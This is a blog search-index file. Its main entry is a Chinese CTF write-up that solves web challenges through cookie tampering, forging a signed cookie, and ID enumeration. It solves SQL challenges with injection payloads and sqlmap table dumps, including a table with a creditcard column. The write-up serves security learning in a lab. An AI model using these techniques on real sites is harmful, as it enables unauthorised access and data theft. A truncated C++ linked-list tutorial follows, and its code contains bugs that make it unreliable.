<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TaiwanHolyYoung Note</title>
      <link href="/2024/05/18/TaiwanHolyYoung/"/>
      <url>/2024/05/18/TaiwanHolyYoung/</url>
      
        <content type="html"><![CDATA[<h1 id="TaiwanHolyYoung-20240518-徐牧微-解答"><a href="#TaiwanHolyYoung-20240518-徐牧微-解答" class="headerlink" title="TaiwanHolyYoung 20240518 徐牧微 解答"></a>TaiwanHolyYoung 20240518 徐牧微 解答</h1><p><span style="font-size: 22px;">平台帳號</span></p><p>使用者名稱 : Momo</p><p>Email : <a href="mailto:&#x32;&#48;&#x31;&#56;&#x75;&#98;&#105;&#x40;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#109;">&#x32;&#48;&#x31;&#56;&#x75;&#98;&#105;&#x40;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#109;</a></p><p>.</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Find-GET-Method"><a href="#1-Find-GET-Method" class="headerlink" title="1. Find GET Method"></a>1. Find GET Method</h3><p>通過開發者工具查看Network中的Header</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/1.%20Find%20GET%20Method%20.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/1.%20Find%20GET%20Method%20.png?raw=true"></a></p><h3 id="2-Find-POST-Method"><a href="#2-Find-POST-Method" class="headerlink" title="2. Find POST Method"></a>2. Find POST Method</h3><p>Key在Inspector就能看到了，能把它顯示</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/2.%20Find%20POST%20Method%20.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/2.%20Find%20POST%20Method%20.png?raw=true"></a></p><h3 id="3-Mystery-Header"><a href="#3-Mystery-Header" class="headerlink" title="3. Mystery Header"></a>3. Mystery Header</h3><p>登入的時候會通過Set-Cookie來儲存狀態</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/3.%20Mystery%20Header.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/3.%20Mystery%20Header.png?raw=true"></a></p><h3 id="4-Find-Mystery-Cookies"><a href="#4-Find-Mystery-Cookies" class="headerlink" title="4. Find Mystery Cookies"></a>4. Find Mystery Cookies</h3><p>在Network還有Storage裡都可以看到登入時新增的Cookie</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/4.%20Find%20Mystery%20Cookies.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/4.%20Find%20Mystery%20Cookies.png?raw=true"></a></p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/4.%20Find%20Mystery%20Cookies%20(2).png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/4.%20Find%20Mystery%20Cookies%20(2).png?raw=true"></a></p><h3 id="5-Modiefy-the-Cookie"><a href="#5-Modiefy-the-Cookie" class="headerlink" title="5. Modiefy the Cookie !"></a>5. Modiefy the Cookie !</h3><p>因為這網站的登入身分貌似只看這個Cookie，在Storage裡更改Cookie改成admin就能以admin身分登入</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/5.%20Modify%20the%20Cookie.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/5.%20Modify%20the%20Cookie.png?raw=true"></a></p><h3 id="6-May-I-have-the-free-point"><a href="#6-May-I-have-the-free-point" class="headerlink" title="6. May I have the free point ?"></a>6. May I have the free point ?</h3><p>物品編號是按順序的，前一個是5429，推得FLAG是5430。<br>所以FLAG在&#x2F;item&#x2F;5430</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/6.%20May%20I%20have%20the%20free%20point.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/6.%20May%20I%20have%20the%20free%20point.png?raw=true"></a></p><h3 id="7-Free-point-for-me"><a href="#7-Free-point-for-me" class="headerlink" title="7.  Free point for me ?"></a>7.  Free point for me ?</h3><p>開發者工具可以顯示、更改數字，可以0元購買FLAG Piont</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/7.%20Free%20point%20for%20me%20.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/7.%20Free%20point%20for%20me%20.png?raw=true"></a></p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/7.%20Free%20point%20for%20me%20%20(2).png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/7.%20Free%20point%20for%20me%20%20(2).png?raw=true"></a></p><h3 id="8-You-can’t-see-me"><a href="#8-You-can’t-see-me" class="headerlink" title="8.  You can’t see me"></a>8.  You can’t see me</h3><p>(一開始我是用瀏覽紀錄得到網址之後用<code>view-source:http://isip-ctf.tyc4d.tw:8005/user/38401</code>顯示原始碼，一樣不會自動重定向到下一頁，可以看到FLAG)</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/8.%20You%20can’t%20see%20me%202.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/8.%20You%20can%E2%80%99t%20see%20me%202.png?raw=true"></a></p><p>還可以用Burp Suite讓它一頁頁forward就能見到FLAG了</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/8.%20You%20can’t%20see%20me%20burp.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/8.%20You%20can%E2%80%99t%20see%20me%20burp.png?raw=true"></a></p><h3 id="9-Where-is-Edward"><a href="#9-Where-is-Edward" class="headerlink" title="9. Where is Edward"></a>9. Where is Edward</h3><p>用Burp Suite Repeater去暴力搜編號，通過length的變化能得知是哪一個有資料</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/9.%20Where%20is%20Edward%20.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/9.%20Where%20is%20Edward%20.png?raw=true"></a></p><h3 id="10-Fix-My-Blog-…"><a href="#10-Fix-My-Blog-…" class="headerlink" title="10. Fix My Blog …"></a>10. Fix My Blog …</h3><p>把舊網址重定向到新網址，網站就可以正常了</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/10.%20Fix%20My%20Blog%20…%20.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/10.%20Fix%20My%20Blog%20%E2%80%A6%20.png?raw=true"></a></p><h3 id="11-Website-Under-Development-Leak-Cookie"><a href="#11-Website-Under-Development-Leak-Cookie" class="headerlink" title="11. Website Under Development &amp; Leak Cookie"></a>11. Website Under Development &amp; Leak Cookie</h3><p>先找到&#x2F;robots.txt</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%201.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%201.png?raw=true"></a></p><p>發現key的檔案</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%202.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%202.png?raw=true"></a></p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%203.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%203.png?raw=true"></a></p><p>用guest登入取得Cookie</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%205.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%205.png?raw=true"></a></p><p>然後用key把Cookie重新編碼，把guest改成admin</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%204.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%204.png?raw=true"></a></p><p>然後再把網頁的Cookie替換</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%206.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%206.png?raw=true"></a></p><p>就能以admin登入了</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%207.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%207.png?raw=true"></a></p><p>最後把不可選的FLAG給啟用</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%208.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%208.png?raw=true"></a></p><p>就完成了</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%209.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/WEB/12.%20Website%20Under%20Development%20&%20Leak%20Cookie%209.png?raw=true"></a></p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="1-Welcome2SQL"><a href="#1-Welcome2SQL" class="headerlink" title="1. Welcome2SQL"></a>1. Welcome2SQL</h3><p>下面有 Magic 的提示，能看出username在單引號裡！<br>所以username有單引號的時候，後面的內容就突破了單引號，可以影響到後面的內容。<br>然後就可以把後面註解掉，避開了密碼的查詢。<br>PS 單引號後後要補上右括號免得報錯！</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/SQL/1.%20Welcome2SQL.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/SQL/1.%20Welcome2SQL.png?raw=true"></a></p><h3 id="2-Dump-All-Data"><a href="#2-Dump-All-Data" class="headerlink" title="2. Dump All Data!"></a>2. Dump All Data!</h3><p>這題要在customer_database資料中找FLAG。先列出所有的資料表。</p><p><code>sqlmap -r web.txt --tables -D customer_database </code></p><p>結果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: customer_database</span><br><span class="line">[2 tables]</span><br><span class="line">+------------+</span><br><span class="line">| flag_table |</span><br><span class="line">| user_info  |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p>然後列出每個資料表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r web.txt --columns -D customer_database -T flag_table</span><br><span class="line">sqlmap -r web.txt --columns -D customer_database -T user_info</span><br></pre></td></tr></table></figure><p>結果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Database: customer_database</span><br><span class="line">Table: flag_table</span><br><span class="line">[7 columns]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| Column   | Type         |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| age      | int(11)      |</span><br><span class="line">| flag_id  | int(11)      |</span><br><span class="line">| height   | double       |</span><br><span class="line">| isAdmin  | binary(1)    |</span><br><span class="line">| usercode | varchar(255) |</span><br><span class="line">| username | varchar(255) |</span><br><span class="line">| weight   | double       |</span><br><span class="line">+----------+--------------+</span><br><span class="line"></span><br><span class="line">Database: customer_database</span><br><span class="line">Table: user_info</span><br><span class="line">[5 columns]</span><br><span class="line">+------------+--------------+</span><br><span class="line">| Column     | Type         |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| address    | varchar(255) |</span><br><span class="line">| creditcard | varchar(255) |</span><br><span class="line">| firstname  | varchar(255) |</span><br><span class="line">| id         | int(11)      |</span><br><span class="line">| lastname   | varchar(255) |</span><br><span class="line">+------------+--------------+</span><br></pre></td></tr></table></figure><p>因為FLAG是一串字，所以在字符串裡找FLAG。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r web.txt -D customer_database -T flag_table -C usercode,username --dump</span><br><span class="line">sqlmap -r web.txt -D customer_database -T user_info -C address,creditcard,firstname,lastname --dump</span><br></pre></td></tr></table></figure><p>結果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Database: customer_database</span><br><span class="line">Table: flag_table</span><br><span class="line">[20 entries]</span><br><span class="line">+----------------+----------+</span><br><span class="line">| usercode       | username |</span><br><span class="line">+----------------+----------+</span><br><span class="line">| TYC-37rfBiMhTA | Willie   |</span><br><span class="line">| TYC-41p4DyVoZu | Kelly    |</span><br><span class="line">| TYC-7YLKYpwczj | Cindy    |</span><br><span class="line">| TYC-8BG1FeqqQU | Gladys   |</span><br><span class="line">| TYC-CyQz5kkgya | Benjamin |</span><br><span class="line">| TYC-IT2XhLcga2 | Paula    |</span><br><span class="line">| TYC-Ic2GodGYwT | Phillip  |</span><br><span class="line">| TYC-Q9nnXBpL70 | Craig    |</span><br><span class="line">| TYC-aqHuAj8WPS | Eugene   |</span><br><span class="line">| TYC-d0mCi5Rc3D | Travis   |</span><br><span class="line">| TYC-eAeN9NEB72 | Melissa  |</span><br><span class="line">| TYC-eskDT8H7ru | Melissa  |</span><br><span class="line">| TYC-hEGjjTqlr4 | Sarah    |</span><br><span class="line">| TYC-lRMELxijlp | Cindy    |</span><br><span class="line">| TYC-qphzHFkHiO | Timothy  |</span><br><span class="line">| TYC-so7ZlWJuvb | Billy    |</span><br><span class="line">| TYC-sqJUhnZKE6 | Janice   |</span><br><span class="line">| TYC-vtDltYZ4TM | Barry    |</span><br><span class="line">| TYC-vwuUdmhDyt | Joyce    |</span><br><span class="line">| TYC-wRB9A652HW | Kimberly |</span><br><span class="line">+----------------+----------+</span><br></pre></td></tr></table></figure><p>然後user_info太長了，所以去到執行結果中的檔案位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[07:21:46] [INFO] table &#x27;customer_database.user_info&#x27; dumped to CSV file &#x27;/home/kali/.local/share/sqlmap/output/isip-ctf.tyc4d.tw/dump/customer_database/user_info.csv&#x27;</span><br></pre></td></tr></table></figure><p>搜尋FLAC，然後得到了大家都喜聞樂見的NOTFLAG{RickRolled!}（確信）</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/SQL/2-2.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/SQL/2-2.png?raw=true"></a></p><p>還有答案的FLAG</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/SQL/2-3.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/SQL/2-3.png?raw=true"></a></p><p>大功告成啊</p><h3 id="3-WHERE-are-you-Shopping-Cart"><a href="#3-WHERE-are-you-Shopping-Cart" class="headerlink" title="3.WHERE are you (Shopping Cart)"></a>3.WHERE are you (Shopping Cart)</h3><p>跟Welcome2SQL一樣，單引號後能夠注入SQL。<br>然後為了查詢除了原本的項目之外，加入<code>OR 1=1</code>讓條件始終成立。</p><p>由於送出請求後購物車一次只有一個項目會顯示，所以要進行排序，以及限制為一個。<code>ORDER BY &#39;id&#39; LIMIT 4,1</code><br>最後把後面的註解掉免得報錯。<code>-- -</code></p><p><code>Canooo1cAM3000D&#39; OR 1=1 ORDER BY &#39;id&#39; LIMIT 4,1 -- -</code></p><p>注入的內容就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tblproduct <span class="keyword">WHERE</span> code<span class="operator">=</span><span class="string">&#x27;Canooo1cAM3000D&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">&#x27;id&#x27;</span> LIMIT <span class="number">4</span>,<span class="number">1</span> <span class="comment">-- -&#x27;</span></span><br></pre></td></tr></table></figure><p>然後編號一個個測能發現，第1234個商品對應0123的id，4就是FLAG，而5之後的id是空的，會顯示不出名稱和圖片。</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/SQL/WHERE%20are%20you%20(Shopping%20Cart)%20.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/SQL/WHERE%20are%20you%20(Shopping%20Cart)%20.png?raw=true"></a></p><h3 id="4-Infomation-Sc…"><a href="#4-Infomation-Sc…" class="headerlink" title="4. Infomation_Sc…?"></a>4. Infomation_Sc…?</h3><p>要找在資料表<code>flag_table</code>中，有幾個欄位的類型是 varchar。</p><p>先運行<code>sqlmap -r web.txt --dbs</code>來查有幾個database<br>(web.txt是Burp Suite攔截的請求)</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/SQL/2-1.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/SQL/2-1.png?raw=true"></a></p><p>結果這五個：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] customer_database</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] shop_database</span><br></pre></td></tr></table></figure><p>然後對每個database查flag_table資料表裡的欄位的數據和類型(<code>--columns</code>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r web.txt -D customer_database --columns -T flag_table</span><br><span class="line">sqlmap -r web.txt -D information_schema --columns -T flag_table</span><br><span class="line">sqlmap -r web.txt -D mysql --columns -T flag_table</span><br><span class="line">sqlmap -r web.txt -D performance_schema --columns -T flag_table</span><br><span class="line">sqlmap -r web.txt -D shop_database --columns -T flag_table</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r web.txt -D customer_database --columns -T flag_table</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">執行結果</span></span><br><span class="line">Database: customer_database</span><br><span class="line">Table: flag_table</span><br><span class="line">[7 columns]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| Column   | Type         |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| age      | int(11)      |</span><br><span class="line">| flag_id  | int(11)      |</span><br><span class="line">| height   | double       |</span><br><span class="line">| isAdmin  | binary(1)    |</span><br><span class="line">| usercode | varchar(255) |</span><br><span class="line">| username | varchar(255) |</span><br><span class="line">| weight   | double       |</span><br><span class="line">+----------+--------------+</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">usercode username 類型為varchar</span></span><br></pre></td></tr></table></figure><p>最後只有customer_database有查到flag_table的數據，usercode和username的類型為varchar。所以答案是兩種</p><h2 id="結果"><a href="#結果" class="headerlink" title="結果"></a>結果</h2><p>目前剩下真實案例挑戰賽Q1</p><p>（有修好了127.0.0.1的重定向，看得到圖片但是密碼摸不著頭腦）</p><p><a data-fancybox="gallery" data-src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/0518-192300.png?raw=true" data-caption=""><img src="https://muweihsu.github.io/files/TaiwanHolyYoung%2020240518/0518-192300.png?raw=true"></a></p><style>body {  font-size: 18px;}p {  font-size: 1em;}h1 {  font-size: 30px;}h2 {  font-size: 24px;}.content h2 {  font-size: 24px !important;}.content h3 {  font-size: 20px !important;}.content h2:before {  content: "" !important;}</>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cybersecurity </tag>
            
            <tag> TaiwanHolyYoung </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linked list</title>
      <link href="/2024/03/21/linked-list/"/>
      <url>/2024/03/21/linked-list/</url>
      
        <content type="html"><![CDATA[<h1 id="Linked-list"><a href="#Linked-list" class="headerlink" title="Linked list"></a>Linked list</h1><p>A linked list is a data structure where elements, called <strong>nodes</strong>, are connected in a linear sequence. Each node contains data and a reference to the next node. This structure allows for dynamic memory allocation and efficient insertion and deletion operations.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Head -&gt; [Node1] -&gt; [Node2] -&gt; [Node3] -&gt; ... -&gt; [NodeN] -&gt; NULL</span><br></pre></td></tr></table></figure><ul><li><strong>Head</strong> points to the first node in the list.</li><li>Each box represents a <strong>node</strong>.</li><li>Inside each box, there is <strong>data</strong> and an arrow pointing to the next node in the sequence.</li><li>The arrow from one node to another signifies the connection between nodes.</li><li>The last node points to <strong>NULL</strong>, indicating the end of the list.</li></ul><h1 id="How-to-implement-a-linked-list"><a href="#How-to-implement-a-linked-list" class="headerlink" title="How to implement a linked list"></a>How to implement a linked list</h1><ol><li>Define a <strong>Node</strong> structure</li><li>Initialize the <strong>Head</strong> pointer</li><li>Implement insertion<ol><li>Create a New Node</li><li>Update the data</li><li>If the list is empty: <ol><li>Update the head pointer to point to the new node.</li><li>Set the “next” pointer of the new node to point to “NULL”</li></ol></li><li>Insertion at the Front<ol><li>Adjust Pointers <ol><li>Set the “next” pointer of the new node to point to the current head of the list.</li><li>Update the head pointer to point to the new node.</li></ol></li></ol></li><li>Insertion at the Back<ol><li>Traverse to the End of the List (last_node)</li><li>Adjust Pointers<ol><li>Set the “next” pointer of the last node to point to the new node, making it the new last node.</li><li>Set the “next” pointer of the new node to NULL.</li></ol></li></ol></li></ol></li></ol><h1 id="Implement-a-linked-list-in-C"><a href="#Implement-a-linked-list-in-C" class="headerlink" title="Implement a linked list in C++"></a>Implement a linked list in C++</h1><ol><li>Define a <strong>Node</strong> structure <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    Node* next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>Initialize the <strong>Head</strong> pointer<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in main</span></span><br><span class="line">node *head;</span><br><span class="line">head.next = <span class="literal">nullptr</span>; <span class="comment">//nullptr = NULL</span></span><br></pre></td></tr></table></figure></li><li>Implement insertion <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> data;</span><br><span class="line">cin &gt;&gt; data;</span><br></pre></td></tr></table></figure><ol><li>Create a New Node   <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node* newNode = <span class="keyword">new</span> Node;</span><br></pre></td></tr></table></figure></li><li>Update the data  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newNode-&gt;data = data;</span><br></pre></td></tr></table></figure></li><li>If the list is empty  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(head-&gt;next == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">    head-&gt;next = newNode;</span><br><span class="line">    newNode-&gt;next = <span class="literal">nullptr</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>Insertion at the Front<ol><li>Adjust Pointers    <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">newNode-&gt;next = head-&gt;next; </span><br><span class="line"></span><br><span class="line">head-&gt;next = newNode;</span><br></pre></td></tr></table></figure></li></ol></li><li>Insertion at the Back<ol><li>Traverse to the End of the List (last_node)   <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node* last_node = head-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(last_node-&gt;next != <span class="literal">nullptr</span>)</span><br><span class="line">    last_node = last_node-&gt;next;</span><br></pre></td></tr></table></figure></li><li>Adjust Pointers   <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">last_node-&gt;next = newNode;</span><br><span class="line">newNode-&gt;next = <span class="literal">nullptr</span>;</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><details open>  <summary style="font-size: 20px;">linked list in C++ with functions to insert nodes at the front and back of the list</summary><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 